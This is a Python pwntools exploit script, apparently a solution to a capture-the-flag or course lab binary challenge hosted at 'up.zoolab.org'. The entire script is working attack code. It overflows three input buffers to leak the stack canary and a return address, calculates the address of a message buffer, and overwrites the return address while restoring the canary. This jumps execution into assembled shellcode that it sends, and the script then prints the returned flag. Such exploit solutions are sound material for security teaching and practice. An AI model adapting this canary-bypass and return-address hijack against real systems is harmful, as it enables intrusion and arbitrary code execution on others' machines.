from pwn import asm, remote

OFFSET_RBP_TO_RETURN_ADDR = 0x08
OFFSET_CANARY_TO_RBP = 0x08
OFFSET_BUF1_TO_RBP = 0x90
OFFSET_BUF2_TO_RBP = OFFSET_BUF1_TO_RBP - 0x30
OFFSET_BUF3_TO_RBP = OFFSET_BUF2_TO_RBP - 0x30

OFFSET_RETURN_ADDR_TO_MSG = 0xE5564


def solve(r: remote, data: bytes):
    r.recvuntil(b"What's your name? ")

    # leak the canary value
    # NOTE: the first byte of canary values is always 0x0
    # So, we don't minus one to consider the newline.
    msg = b"A" * (OFFSET_BUF1_TO_RBP - OFFSET_CANARY_TO_RBP)
    r.sendline(msg)
    canary_bytes = b"\x00" + r.recvlinesb(2)[1][:7]
    canary_val = int.from_bytes(canary_bytes, byteorder="little")
    print(f"canary value: 0x{canary_val:x}")

    r.recvuntil(b"What's the room number? ")

    # leak the return address
    msg = b"A" * (OFFSET_BUF2_TO_RBP + OFFSET_RBP_TO_RETURN_ADDR - 1)
    r.sendline(msg)
    ret_addr = int.from_bytes(r.recvlinesb(2)[1], byteorder="little")
    print(f"original return address: 0x{ret_addr:x}")

    r.recvuntil(b"What's the customer's name? ")

    # calculate the absolute address of msg buffer based on the return address
    msg_addr = ret_addr + OFFSET_RETURN_ADDR_TO_MSG
    print(f"msg buffer address: 0x{msg_addr:x}")

    # modify the return address & restore the canary value
    msg = (
        b"A" * (OFFSET_BUF3_TO_RBP - OFFSET_CANARY_TO_RBP)
        + canary_bytes
        + b"A" * OFFSET_RBP_TO_RETURN_ADDR
        + msg_addr.to_bytes(8, byteorder="little")
    )
    r.sendline(msg)

    r.recvuntil(b"Leave your message: ")
    r.sendline(data)
    r.recvline()

    msg = r.recvuntil(b"}").decode()
    print(msg)

    r.close()


if __name__ == "__main__":
    with open("./chal_1.asm") as f:
        content = f.read()

    data = asm(content, arch="amd64", os="linux")
    print("Length of the shellcode: ", len(data))

    ## for remote access
    r = remote("up.zoolab.org", 12343)
    solve(r, data)
